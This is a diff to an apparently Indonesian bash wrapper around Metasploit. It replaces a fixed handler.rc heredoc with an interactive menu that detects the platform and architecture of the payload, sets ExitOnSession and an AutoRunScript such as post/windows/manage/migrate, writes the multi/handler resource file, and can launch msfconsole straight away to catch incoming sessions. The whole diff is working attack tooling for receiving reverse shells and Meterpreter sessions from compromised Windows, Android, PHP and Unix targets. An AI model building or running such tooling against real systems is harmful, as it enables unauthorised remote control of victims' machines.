@@ -140,16 +140,91 @@ if [ $? -eq 0 ]; then
 
     read -p "$(printf "${Y}${BD}[?]${NC} Buat listener otomatis (handler.rc)? ${C}[y/N]:${NC} ")" BUILD_RC
     if [[ "$BUILD_RC" =~ ^[Yy]$ ]]; then
-        cat <<EOF > handler.rc
-use exploit/multi/handler
-set PAYLOAD $PAYLOAD
-set LHOST $LHOST
-set LPORT $LPORT
-set ExitOnSession false
-exploit -j
-EOF
-        printf "\n${G}${BD}[+]${NC} Resource file dibuat : ${W}${BD}handler.rc${NC}\n"
-        printf "${C}${BD}[*]${NC} Jalankan listener : ${W}${BD}msfconsole -r handler.rc${NC}\n"
+        # ---------- Deteksi Platform & Arch ----------
+        case "$PAYLOAD" in
+            windows/x64/*)   H_PLATFORM="windows"; H_ARCH="x64" ;;
+            windows/*)       H_PLATFORM="windows"; H_ARCH="x86" ;;
+            android/*)       H_PLATFORM="android"; H_ARCH="dalvik" ;;
+            php/*)           H_PLATFORM="php";     H_ARCH="php" ;;
+            nodejs/*)        H_PLATFORM="nodejs";  H_ARCH="nodejs" ;;
+            java/*)          H_PLATFORM="java";    H_ARCH="java" ;;
+            cmd/unix/*)      H_PLATFORM="unix";    H_ARCH="cmd" ;;
+            cmd/windows/*)   H_PLATFORM="windows"; H_ARCH="cmd" ;;
+            *)               H_PLATFORM="";        H_ARCH="" ;;
+        esac
+
+        H_EXIT="false"
+        H_SCRIPT=""
+        H_LAUNCH="n"
+
+        # ---------- Menu Pengaturan Handler ----------
+        while true; do
+            printf "\n"
+            line
+            printf "${P}${BD}  PENGATURAN HANDLER${NC}\n"
+            line
+            label "Payload"       "$PAYLOAD"
+            label "LHOST"         "$LHOST"
+            label "LPORT"         "$LPORT"
+            label "Platform"      "${H_PLATFORM:-auto}"
+            label "Arch"          "${H_ARCH:-auto}"
+            label "ExitOnSession" "$H_EXIT"
+            label "AutoRunScript" "${H_SCRIPT:-kosong}"
+            label "Auto-launch"   "${H_LAUNCH}"
+            line
+            printf "${C}${BD}│${NC} ${W}${BD}[1]${NC} Ubah ExitOnSession (tetap dengar setelah session)  ${C}${BD}│${NC}\n"
+            printf "${C}${BD}│${NC} ${W}${BD}[2]${NC} AutoRunScript (cth: post/windows/manage/migrate)     ${C}${BD}│${NC}\n"
+            printf "${C}${BD}│${NC} ${W}${BD}[3]${NC} Auto-launch msfconsole langsung                      ${C}${BD}│${NC}\n"
+            printf "${C}${BD}│${NC} ${W}${BD}[s]${NC} Simpan handler.rc                                       ${C}${BD}│${NC}\n"
+            printf "${C}${BD}│${NC} ${W}${BD}[q]${NC} Batal                                                   ${C}${BD}│${NC}\n"
+            line
+            printf "${Y}${BD}┌─${NC} ${W}${BD}Pilih${NC} ${Y}${BD}─┐${NC}\n"
+            printf "${Y}${BD}└─❯${NC} "
+            read -r H_OPT
+
+            case "$H_OPT" in
+                1)
+                    printf "${C}${BD}[*]${NC} ExitOnSession [default: $H_EXIT]: "
+                    read -r H_EXIT_IN
+                    [ -n "$H_EXIT_IN" ] && H_EXIT="$H_EXIT_IN"
+                    ;;
+                2)
+                    printf "${C}${BD}[*]${NC} AutoRunScript [kosong=hapus]: "
+                    read -r H_SCRIPT
+                    ;;
+                3)
+                    if [[ "$H_LAUNCH" == "y" ]]; then H_LAUNCH="n"; else H_LAUNCH="y"; fi
+                    ;;
+                s|S)
+                    {
+                        echo "use exploit/multi/handler"
+                        echo "set PAYLOAD $PAYLOAD"
+                        [ -n "$H_PLATFORM" ] && echo "set PLATFORM $H_PLATFORM"
+                        [ -n "$H_ARCH" ] && echo "set ARCH $H_ARCH"
+                        echo "set LHOST $LHOST"
+                        echo "set LPORT $LPORT"
+                        echo "set ExitOnSession $H_EXIT"
+                        [ -n "$H_SCRIPT" ] && echo "set AutoRunScript $H_SCRIPT"
+                        echo "exploit -j"
+                    } > handler.rc
+                    printf "\n${G}${BD}[+]${NC} Resource file dibuat : ${W}${BD}handler.rc${NC}\n"
+                    if [[ "$H_LAUNCH" == "y" ]]; then
+                        printf "${C}${BD}[*]${NC} Menjalankan listener... (Ctrl+C untuk keluar)${NC}\n"
+                        msfconsole -q -r handler.rc
+                    else
+                        printf "${C}${BD}[*]${NC} Jalankan listener : ${W}${BD}msfconsole -r handler.rc${NC}\n"
+                    fi
+                    break
+                    ;;
+                q|Q)
+                    printf "\n${Y}${BD}[!]${NC} Pembuatan handler dibatalkan.\n"
+                    break
+                    ;;
+                *)
+                    err "Pilihan tidak valid."
+                    ;;
+            esac
+        done
     fi
 else
     printf "\n"
